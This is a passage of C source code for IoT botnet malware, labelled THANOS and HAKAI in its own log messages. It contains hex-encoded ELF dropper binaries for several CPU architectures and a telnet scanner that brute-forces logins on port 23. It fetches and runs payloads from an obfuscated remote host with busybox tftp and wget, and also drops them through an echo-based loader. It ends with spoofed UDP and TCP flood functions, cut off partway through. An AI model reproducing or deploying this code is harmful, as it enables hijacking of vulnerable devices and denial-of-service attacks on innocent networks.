\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x80\x00\x00\x94\x00\x00\x00\x94\x00\x00\x02\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x80\x00\x02\xf4\x00\x00\x02\xf4\x00\x00\x00\x23\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x80\x00\x23\x18\x00\x00\x03\x18\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x18\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1024,
    // sparc
    BIT_32, ENDIAN_BIG, EM_SPARC, "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x02\x00\x00\x00\x01\x00\x01\x01\x80\x00\x00\x00\x34\x00\x00\x03\x38\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x03\x18\x00\x00\x03\x18\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x03\x18\x00\x02\x03\x18\x00\x02\x03\x18\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x92\x10\x00\x08\x90\x10\x20\x01\x82\x13\xc0\x00\x10\x80\x00\x7f\x01\x00\x00\x00\x01\x00\x00\x00\x92\x10\x00\x08\x90\x10\x20\x06\x82\x13\xc0\x00\x10\x80\x00\x79\x01\x00\x00\x00\x01\x00\x00\x00\x82\x10\x00\x09\x96\x10\x00\x0a\x92\x10\x00\x08\x94\x10\x00\x01\x90\x10\x20\x05\x82\x13\xc0\x00\x10\x80\x00\x70\x01\x00\x00\x00\x01\x00\x00\x00\x9d\xe3\xbf\x88\x92\x10\x20\x03\xf0\x27\xbf\xec\xf2\x27\xbf\xf0\xf4\x27\xbf\xf4\x94\x07\xbf\xec\x40\x00\x00\x67\x90\x10\x20\xce\x81\xc7\xe0\x08\x91\xe8\x00\x08\x82\x10\x00\x09\x96\x10\x00\x0a\x92\x10\x00\x08\x94\x10\x00\x01\x90\x10\x20\x04\x82\x13\xc0\x00\x10\x80\x00\x5d\x01\x00\x00\x00\x01\x00\x00\x00\x82\x10\x00\x09\x96\x10\x00\x0a\x92\x10\x00\x08\x94\x10\x00\x01\x90\x10\x20\x03\x82\x13\xc0\x00\x10\x80\x00\x54\x01\x00\x00\x00\x01\x00\x00\x00\x9d\xe3\xbf\x88\x92\x10\x20\x01\xf0\x27\xbf\xec\xf2\x27\xbf\xf0\xf4\x27\xbf\xf4\x94\x07\xbf\xec\x40\x00\x00\x4b\x90\x10\x20\xce\x81\xc7\xe0\x08\x91\xe8\x00\x08\x9d\xe3\xbf\x00\x82\x10\x20\x02\xc2\x37\xbf\xe4\x82\x10\x20\x50\x92\x10\x26\x01\x94\x10\x21\xff\xc2\x37\xbf\xe6\x03\x2c\xa0\x2e\x82\x10\x61\xfa\x11\x00\x00\x40\xc2\x27\xbf\xe8\x7f\xff\xff\xc6\x90\x12\x22\xf0\x92\x10\x20\x01\x94\x10\x20\x00\xa4\x10\x00\x08\x7f\xff\xff\xe6\x90\x10\x20\x02\x92\x07\xbf\xe4\xa2\x10\x00\x08\x7f\xff\xff\xc6\x94\x10\x20\x10\x90\x10\x00\x11\x13\x00\x00\x40\x94\x10\x20\x1b\x7f\xff\xff\xcb\x92\x12\x62\xf8\x80\xa2\x20\x1b\x02\x80\x00\x05\xa0\x10\x20\x00\x7f\xff\xff\xa7\x90\x10\x20\x03\xa0\x10\x20\x00\x92\x07\xbf\xf7\x94\x10\x20\x01\x7f\xff\xff\xca\x90\x10\x00\x11\x80\xa2\x20\x01\x02\x80\x00\x05\xc2\x4f\xbf\xf7\x7f\xff\xff\x9d\x90\x10\x20\x04\xc2\x4f\xbf\xf7\x85\x2c\x20\x08\xa0\x10\x80\x01\x03\x03\x42\x83\x82\x10\x61\x0a\x80\xa4\x00\x01\x12\xbf\xff\xf2\x92\x07\xbf\xf7\xa0\x07\xbf\x64\x90\x10\x00\x11\x92\x10\x00\x10\x7f\xff\xff\xb8\x94\x10\x20\x80\x80\xa2\x20\x00\x04\x80\x00\x07\x94\x10\x00\x08\x92\x10\x00\x10\x7f\xff\xff\xa9\x90\x10\x00\x12\x10\xbf\xff\xf6\xa0\x07\xbf\x64\x7f\xff\xff\x8c\x90\x10\x00\x11\x7f\xff\xff\x8a\x90\x10\x00\x12\x7f\xff\xff\x82\x90\x10\x20\x03\x81\xc7\xe0\x08\x81\xe8\x00\x00\x82\x10\x00\x08\x90\x10\x00\x09\x92\x10\x00\x0a\x94\x10\x00\x0b\x96\x10\x00\x0c\x98\x10\x00\x0d\x91\xd0\x20\x10\x0a\x80\x00\x04\x01\x00\x00\x00\x81\xc3\xe0\x08\x01\x00\x00\x00\x9d\xe3\xbf\x98\x40\x00\x00\x05\x01\x00\x00\x00\xf0\x22\x00\x00\x81\xc7\xe0\x08\x91\xe8\x3f\xff\x11\x00\x00\x80\x81\xc3\xe0\x08\x90\x12\x23\x18\x00\x00\x00\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x73\x70\x63\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x01\x00\x94\x00\x00\x00\x94\x00\x00\x02\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x01\x02\xf0\x00\x00\x02\xf0\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x02\x03\x18\x00\x00\x03\x18\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x18\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1024,
    // superh
    BIT_32, ENDIAN_LITTLE, EM_SH, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x2a\x00\x01\x00\x00\x00\x68\x01\x40\x00\x34\x00\x00\x00\xfc\x02\x00\x00\x02\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\xdc\x02\x00\x00\xdc\x02\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\xdc\x02\x00\x00\xdc\x02\x41\x00\xdc\x02\x41\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00\x00\x00\x01\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x00\x00\x00\x04\xd1\x43\x65\xe6\x2f\x01\xe4\xf3\x6e\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x09\x00\x68\x02\x40\x00\x04\xd1\x43\x65\xe6\x2f\x06\xe4\xf3\x6e\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x09\x00\x68\x02\x40\x00\x53\x61\x63\x67\x13\x66\x04\xd1\xe6\x2f\x43\x65\xf3\x6e\x05\xe4\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x68\x02\x40\x00\xe6\x2f\x22\x4f\x07\xd0\xf4\x7f\xf3\x6e\x42\x2e\x51\x1e\x66\xe4\x62\x1e\x03\xe5\x0b\x40\xe3\x66\x0c\x7e\xe3\x6f\x26\x4f\xf6\x6e\x0b\x00\x09\x00\x68\x02\x40\x00\x53\x61\x63\x67\x13\x66\x04\xd1\xe6\x2f\x43\x65\xf3\x6e\x04\xe4\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x68\x02\x40\x00\x53\x61\x63\x67\x13\x66\x04\xd1\xe6\x2f\x43\x65\xf3\x6e\x03\xe4\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x68\x02\x40\x00\xe6\x2f\x22\x4f\x07\xd0\xf4\x7f\xf3\x6e\x42\x2e\x51\x1e\x66\xe4\x62\x1e\x01\xe5\x0b\x40\xe3\x66\x0c\x7e\xe3\x6f\x26\x4f\xf6\x6e\x0b\x00\x09\x00\x68\x02\x40\x00\x86\x2f\x02\xe1\x96\x2f\xa6\x2f\xb6\x2f\xe6\x2f\x22\x4f\x5b\x92\xb4\x7f\x5a\x90\xb8\x7f\x59\x98\xf3\x6e\x25\x0e\xec\x38\x2d\xd0\x11\x28\x2d\xd1\x2d\xd4\x11\x18\x51\x95\x51\x96\x0b\x40\x09\x00\x03\x6b\x2b\xd0\x02\xe4\x01\xe5\x0b\x40\x00\xe6\x03\x64\x03\x69\x28\xd0\x83\x65\x0b\x40\x10\xe6\x27\xd0\x93\x64\x27\xd5\x0b\x40\x1b\xe6\x1b\x88\x02\x89\x26\xd1\x0b\x41\x03\xe4\x00\xe8\x38\x9a\x93\x64\x24\xd0\x01\xe6\xec\x3a\xa3\x65\x0b\x40\x18\x48\x01\x88\x03\x8d\x04\xe4\x1e\xd1\x0b\x41\x09\x00\xa0\x61\x1b\x28\x1e\xd1\x10\x38\xec\x8b\x1b\xd0\x93\x64\x20\x96\x0b\x40\xe3\x65\x15\x40\xe3\x65\x03\x66\x05\x8f\xb3\x64\x13\xd0\x0b\x40\x09\x00\xf1\xaf\x09\x00\x16\xd8\x0b\x48\x93\x64\x0b\x48\xb3\x64\x10\xd1\x0b\x41\x03\xe4\x48\x7e\x4c\x7e\xe3\x6f\x26\x4f\xf6\x6e\xf6\x6b\xf6\x6a\xf6\x69\xf6\x68\x0b\x00\x09\x00\x00\x50\x82\x00\x80\x00\x41\x02\xff\x01\x93\x00\xc4\x00\x40\x00\xb2\x80\xb9\xfa\xb8\x02\x40\x00\x40\x01\x40\x00\xe0\x00\x40\x00\x08\x01\x40\x00\xc0\x02\x40\x00\x94\x00\x40\x00\x24\x01\x40\x00\x0a\x0d\x0a\x0d\xac\x00\x40\x00\x86\x2f\x43\x63\xe6\x2f\x53\x64\x22\x4f\x63\x65\xf3\x6e\x73\x66\xe4\x50\xe3\x57\xe5\x51\x16\xc3\x82\xe1\x16\x30\x06\x8f\x03\x68\x05\xd0\x0b\x40\x09\x00\x8b\x61\x12\x20\xff\xe0\xe3\x6f\x26\x4f\xf6\x6e\xf6\x68\x0b\x00\x09\x00\xa4\x02\x40\x00\x03\xd0\xe6\x2f\xf3\x6e\xe3\x6f\xf6\x6e\x0b\x00\x09\x00\x09\x00\xdc\x02\x41\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x73\x68\x34\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x94\x00\x40\x00\x94\x00\x00\x00\x24\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xb8\x02\x40\x00\xb8\x02\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xdc\x02\x41\x00\xdc\x02\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdc\x02\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 964,

    BIT_32, ENDIAN_LITTLE, EM_ARC, "\x7f\x45\x4c\x7f\x45\x4c", 12,
};

static struct payload *get_retrieve_binary(struct telnet_state_t *fd)
{
    int i = 0;
    struct payload *ptr = &payloads[i];
    

    while(ptr)
    {
        if(i == NUM_OF_PAYLOADS)
            break;
        //debug
        //thanosprint(uhmysockethere, "attempting to compare bit endian, machine with payload %d:%d:%d, %d:%d:%d\n", fd->bit, fd->endianness, fd->machine, ptr->bit, ptr->endian, ptr->machine);
        if(fd->bit == ptr->bit && fd->endianness == ptr->endian && fd->machine == ptr->machine)
            return ptr;
        ptr++;
        i++;
    }
    
    return NULL;
}

static struct binary *process_retrieve_binary(struct telnet_state_t *fd, struct payload *p)
{
    int i = 0;
    int pos = 0;
    struct binary *bin;
    char buf[5];
    int idx = 0;
    char buf2[MAX_ECHO_BYTES * 4];

    memset(buf2, 0, MAX_ECHO_BYTES * 4);    
    bin = (struct binary *)calloc(p->len / MAX_ECHO_BYTES, sizeof(struct binary));

    for(i = 0; i < p->len / MAX_ECHO_BYTES; i++)
        bin[i].str = (char *)malloc(MAX_ECHO_BYTES * 4);

    retry:
    for(i = 0; i < p->len; i++)
    {
        if(i == MAX_ECHO_BYTES)
            break;
        memset(buf, 0, 5);
        sprintf(buf, "\\x%02x", (uint8_t)p->str[pos + i]);
        
        strcat(buf2, buf);
    }

    if(idx == p->len / MAX_ECHO_BYTES)
        return bin;

    
    memcpy(bin[idx].str, buf2, strlen(buf2));
    memset(buf2, 0, MAX_ECHO_BYTES * 4);
    bin->index = idx;
    idx++;
    pos += i;
    goto retry;
}
static void check_timeout(struct telnet_state_t *fd, uint16_t timeout)
{
    uint32_t now = time(NULL);
    char ret = fd->ttltimeout + timeout < now ? 1 : 0;

    if(ret)
    {
        reset_telnet_state(fd, 1);
    }

    return;
}


void telnet_scanner()
{ 
    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    char buf[128];
    int valopt = 0, max_ktx = 0, cpu_cores = sysconf(_SC_NPROCESSORS_ONLN), res = 0, i = 0, j = 0, b = 0, c = 0, gg = 0, o = 0, feg;
    rand_init();
    struct payload *p;
    struct binary *bin;

    if(cpu_cores == 1)
        max_ktx = 500;
       
    else if(cpu_cores > 1)
    //max_ktx = 1; // debug
      max_ktx = 1000;
    else
        exit(1);

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(23);
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    struct telnet_state_t ktx[max_ktx];
    memset(ktx, 0, max_ktx * (sizeof(int) + 1));
    
        for(i = 0; i < max_ktx; i++)
    {
        //ktx[i].complete = 1;
        memset(&(ktx[i]), 0, sizeof(struct telnet_state_t));
        ktx[i].complete = 1;
        ktx[i].dropper_index = 0;
        ktx[i].bit = 0;
        ktx[i].endianness = 0;
        ktx[i].machine = 0;
        ktx[i].usernind = 0;
        ktx[i].pwordind = 0;
    }
    thanosprint(uhmysockethere, "[THANOS] Scanner Starting : [%s]\n", inet_ntoa(ourIP));    while(1)
    {
        for(i = 0; i < max_ktx; i++) 
        {
            switch(ktx[i].state)
            {
            case 0:
                {
                    if(ktx[i].complete == 1)
                    {
                        memset(&(ktx[i]), 0, sizeof(struct telnet_state_t));
                        //ktx[i].ip = inet_addr("178.128.174.71");    
                        ktx[i].ip = scantelnetip();
                    }
                    else if(ktx[i].complete == 0)
                    {
                        ktx[i].pwordind++;
                        ktx[i].usernind++;
                        if(ktx[i].pwordind == sizeof(passwords) / sizeof(char *)) { ktx[i].complete == 1; continue; }
                        if(ktx[i].usernind == sizeof(usernames) / sizeof(char *)) { ktx[i].complete == 1; continue; }
                    }
                    dest_addr.sin_family = AF_INET;
                    dest_addr.sin_port = htons(23); 
                    memset(dest_addr.sin_zero, '\0', sizeof(dest_addr.sin_zero));
                    dest_addr.sin_addr.s_addr = ktx[i].ip;
                    ktx[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    if(ktx[i].fd == -1){continue;}
                    fcntl(ktx[i].fd, F_SETFL, fcntl(ktx[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if(connect(ktx[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS){set_state(&ktx[i], 1); continue;}
                    else{set_state(&ktx[i], 1);}
            }
                break;

            case 1:
                {
                    
                    FD_ZERO(&myset); FD_SET(ktx[i].fd, &myset); tv.tv_sec = 0; tv.tv_usec = 100; res = select(ktx[i].fd + 1, NULL, &myset, NULL, &tv);
                    if(res == 1)
                    {
                        lon = sizeof(int); valopt = 0; getsockopt(ktx[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                        if(valopt){reset_telnet_state(&ktx[i], 1); }else{fcntl(ktx[i].fd, F_SETFL, fcntl(ktx[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));set_state(&ktx[i], 2);} continue;
                    }
                    else if(res == -1){reset_telnet_state(&ktx[i], 1);}
                    check_timeout(&ktx[i], 5);
                }
                break;

            case 2:
                {
                    if(read_until_response(ktx[i].fd, 100, ktx[i].sock_buffer, SOCK_BUFSIZE, login_prompts)){if(compare_strings(ktx[i].sock_buffer, login_prompts)){set_state(&ktx[i], 3);}else{reset_telnet_state(&ktx[i], 1);}continue; }
                    check_timeout(&ktx[i], 7);
                }
                break;
            
            case 3:
                {   
                    
                    if(thanosprint(ktx[i].fd, "%s\r\n",  usernames[ktx[i].usernind]) < 0)
                    {   
                         reset_telnet_state(&ktx[i], 1);
                        continue;
                    }
                    set_state(&ktx[i], 4);
                
                }
                break;
            
            case 4:
                {
                    if(read_until_response(ktx[i].fd, 100, ktx[i].sock_buffer, SOCK_BUFSIZE, login_prompts)) { if(compare_strings(ktx[i].sock_buffer, login_prompts)) {set_state(&ktx[i], 5); }  else {set_state(&ktx[i], 5);} continue;   }
                    check_timeout(&ktx[i], 7);
                }
                break;
            
            case 5:
                {
                    if(thanosprint(ktx[i].fd, "%s\r\n",passwords[ktx[i].pwordind]) < 0)
                    {
                        reset_telnet_state(&ktx[i], 1);continue;}set_state(&ktx[i], 6);
                }
                break;

                break;
            case 6:
                {

                if(read_until_response(ktx[i].fd, 100, ktx[i].sock_buffer, SOCK_BUFSIZE, fail_or_success))
                    {
                        if(compare_strings(ktx[i].sock_buffer, fail_prompts))
                            {
                    
                                reset_telnet_state(&ktx[i], 0);
                            }
                        else if(compare_strings(ktx[i].sock_buffer, success_prompts))
                        {
                            thanosprint(uhmysockethere, "[THANOS] ATTEMPT [%s:23 %s:%s]\n",inet_ntoa(*(struct in_addr *)&(ktx[i].ip)), usernames[ktx[i].usernind], passwords[ktx[i].pwordind]);
                            set_state(&ktx[i], 7);
                        }
                        else { 

                            set_state(&ktx[i], 7);
                        } continue; 
                    }
                    check_timeout(&ktx[i], 15);
                }
                break;
                case 7:
                {
                    thanosprint(ktx[i].fd, "sh\r\n");
                    thanosprint(ktx[i].fd, "shell\r\n");
                    thanosprint(ktx[i].fd, "enable\r\n");
                    thanosprint(ktx[i].fd, "linuxshell\r\n");
                    thanosprint(ktx[i].fd, "system\r\n");
                        set_state(&ktx[i], 8);
                        continue;
                }
                break;

            case 8:
                {
                        if(thanosprint(ktx[i].fd, "/bin/busybox cat /bin/busybox\r\n") < 1)
                        {
                            reset_telnet_state(&ktx[i], 1);
                            continue;
                        }
                        set_state(&ktx[i], 9);
                }
                break;
            case 9:
                {
                    if(read_until_response(ktx[i].fd, 100, ktx[i].sock_buffer, SOCK_BUFSIZE, elf_response)){
                        int ret = parse_elf_response(&ktx[i]);
                        if(!ret)
                        {
                           reset_telnet_state(&ktx[i], 1);
                            continue;
                        }
                        // success!
                        sleep(5);
                        ktx[i].complete = 2;
                        set_state(&ktx[i], 10);
                        continue;

               
                    }
                    check_timeout(&ktx[i], 15);
                }
                break;
                case 10:
                {
                for(j = 0; j < 7; j++)
                {
                    thanosprint(ktx[i].fd, ">%sZS && cd %s && >ZoneSecBox; >.HAKAI\r\n", tmp_dirs[j], tmp_dirs[j]);
                    continue;
                }
                thanosprint(ktx[i].fd, "/bin/busybox cp /bin/busybox ZS && >ZS && /bin/busybox chmod 777 ZS && /bin/busybox cp /bin/busybox .HAKAI && >.HAKAI && /bin/busybox chmod 777 .HAKAI\r\n");
                thanosprint(ktx[i].fd, "/bin/busybox THANOS; /bin/busybox tftp; /bin/busybox wget\r\n");
                set_state(&ktx[i], 11);
                }
                 case 11:
                {  
                    int r;
                    char str[] = {"4:;145;14;81583"};
                    for(r = 0; (r < 100 && str[r] != '\0'); r++)
                    str[r] = str[r] - 3;
                    thanosprint(uhmysockethere, "[THANOS] tftp/wget selected! dropping binary...\r\n");
                    thanosprint(ktx[i].fd, "/bin/busybox tftp -r %s -g %s; /bin/busybox chmod +x %s; ./%s\r\n", ktx[i].arch, str, ktx[i].arch, ktx[i].arch, ktx[i].arch);
                    thanosprint(ktx[i].fd, "/bin/busybox wget http://%s/hakai.%s -O -> hakai; /bin/busybox chmod +x hakai; ./hakai\r\n", str, ktx[i].arch);
                    check_timeout(&ktx[i], 5);
                    thanosprint(uhmysockethere, "SUCCESS [%s:23 %s:%s %s]\n", inet_ntoa(*(struct in_addr *)&(ktx[i].ip)), usernames[ktx[i].usernind], passwords[ktx[i].pwordind], ktx[i].arch);
                    thanosprint(uhmysockethere, "LOCKED %s:23 %s:%s %s\n", inet_ntoa(*(struct in_addr *)&(ktx[i].ip)), usernames[ktx[i].usernind], passwords[ktx[i].pwordind], ktx[i].arch);
                    thanosprint(uhmysockethere, "[ECHO:%s] taking over process just in case of failure.\r\n", ktx[i].arch);
                    set_state(&ktx[i], 12);
                    continue;
    
                }
                break;
                 case 12:
                {
                
                            p = get_retrieve_binary(&ktx[i]);
                            if(!p)
                            {
                                free(p);
                                thanosprint(uhmysockethere, "[ECHO] Failed to retrieve a dropper\r\n");
                                reset_telnet_state(&ktx[i], 1);
                                continue;
                            }
                            
                            bin = process_retrieve_binary(&ktx[i], p);
                            if(!bin)
                            {
                                free(bin);
                                thanosprint(uhmysockethere, "[ECHO] Failed to process the retrieve binary\r\n");
                               reset_telnet_state(&ktx[i], 1);
                                continue;
                            }
                            //debug
                          //thanosprint(uhmysockethere, "Processed retrieve binary!, binary index %d\n", bin->index);
                          
                          
                          if(thanosprint(ktx[i].fd, "/bin/busybox echo -en '%s' %s .HAKAI; %s && /bin/busybox echo -en '\\x44\\x52\\x4f\\x50\\x50\\x45\\x52'\r\n", bin[ktx[i].dropper_index].str, ktx[i].dropper_index == 0 ? ">" : ">>", ktx[i].dropper_index == bin->index ? "/bin/busybox chmod 777 .HAKAI; ./.HAKAI; /bin/busybox chmod 777 rekai; ./rekai" : ">xzonesec") < 1)
                            {
                                reset_telnet_state(&ktx[i], 1);
                                continue;
                            }
                            thanosprint(uhmysockethere, "[ECHO:%s] Echo loader: dropped line [%d] of payload [%s] -> [%s]\r\n", ktx[i].arch, ktx[i].dropper_index, ktx[i].arch, inet_ntoa(*(struct in_addr *)&(ktx[i].ip)));
                           if(ktx[i].dropper_index == bin->index)
                            {
                            thanosprint(uhmysockethere, "[THANOS] [%s:23 %s:%s] [%s] -> binary successfully deployed!\r\n",inet_ntoa(*(struct in_addr *)&(ktx[i].ip)), usernames[ktx[i].usernind], passwords[ktx[i].pwordind], ktx[i].arch);

                               set_state(&ktx[i], 17);
                                continue;
                            }
                            ktx[i].dropper_index++;
                            free(bin);
                            set_state(&ktx[i], 13); 
                    }

                
                break;
                case 13:
                {
                      int deployed = read_until_response(ktx[i].fd, 100, ktx[i].sock_buffer, SOCK_BUFSIZE, echofinished);
                      if(deployed)
                      {
                        //debug
                        //thanosprint(uhmysockethere, "\n\n[DEBUG] -> [%s] telnet feedback: [%s]\n\n", ktx[i].arch, ktx[i].sock_buffer);
                        set_state(&ktx[i], 12); 
                        continue;
                      }
                      
                
                }
                break;
            case 17:
                {
                         int deployed = read_until_response(ktx[i].fd, 100, ktx[i].sock_buffer, SOCK_BUFSIZE, echofinished);
                      if(deployed)
                      {
                        thanosprint(uhmysockethere, "[THANOS] EXEUCITON CONFIRMED! -> [%s]\r\n", inet_ntoa(*(struct in_addr *)&(ktx[i].ip)));
                         set_state(&ktx[i], 21);
                    continue;
                    } 
                    set_state(&ktx[i], 21);
                    continue;
            }
                break;
            
                
                
            case 21:
                {  
                thanosprint(ktx[i].fd, "/bin/busybox THANOS COMPLETE; /bin/busybox ZHWUZHERE\r\n");
                         check_timeout(&ktx[i], 5);

                     
                }
                break;           
        }
    }

}
}

void makeRandomStr(unsigned char *buf, int length)
{
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

void audp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
    struct sockaddr_in dest_addr; dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return; memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister; pollRegister = pollinterval;
    if(spoofit == 32) {int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);  
    if(!sockfd) { 
    return; 
    } 
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1); 
    if(buf == NULL) return; memset(buf, 0, packetsize + 1); 
    makeRandomStr(buf, packetsize); 
    int end = time(NULL) + timeEnd;  
    register unsigned int i = 0; 
    while(1) { 
    sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); 
    if(i == pollRegister) { 

        if(port == 0) dest_addr.sin_port = rand_cmwc(); 
    if(time(NULL) > end) 
        break; i = 0; continue; } i++; }} else {int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); if(!sockfd) {  return;} int tmp = 1; if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){return;} int counter = 50; while(counter--) { srand(time(NULL) ^ rand_cmwc());init_rand(rand());} in_addr_t netmask; if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) ); else netmask = ( ~((1 << (32 - spoofit)) - 1) );unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize]; struct iphdr *iph = (struct iphdr *)packet; struct udphdr *udph = (void *)iph + sizeof(struct iphdr);  makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize); udph->len = htons(sizeof(struct udphdr) + packetsize);  udph->source = rand_cmwc(); udph->dest = (port == 0 ? rand_cmwc() : htons(port)); udph->check = 0; makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize); iph->check = csum ((unsigned short *) packet, iph->tot_len); int end = time(NULL) + timeEnd; register unsigned int i = 0; while(1){ sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));  udph->source = rand_cmwc();  udph->dest = (port == 0 ? rand_cmwc() : htons(port)); iph->id = rand_cmwc(); iph->saddr = htonl( getRandomIP(netmask) ); iph->check = csum ((unsigned short *) packet, iph->tot_len); if(i == pollRegister){if(time(NULL) > end) break; i = 0; continue; } i++; } }
}

void atcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
    register unsigned int pollRegister; pollRegister = pollinterval;
    struct sockaddr_in dest_addr; 
    dest_addr.sin_family = AF_INET; 
    if(port == 0) 
    dest_addr.sin_port = rand_cmwc(); 
    else 
    dest_addr.sin_port = htons(port); 
